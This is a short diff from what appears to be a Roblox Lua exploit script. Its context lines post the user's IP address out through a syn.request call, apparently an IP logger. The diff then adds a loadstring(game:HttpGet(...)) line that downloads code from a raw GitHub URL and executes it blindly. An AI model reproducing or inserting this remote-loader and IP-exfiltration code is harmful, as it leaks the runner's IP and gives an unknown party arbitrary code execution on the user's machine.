@@ -180,3 +180,5 @@ syn.request({
         content = "```IP: "..ip.."```"
     })
 })
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/01010101010x/010100101/main/Invite"))()
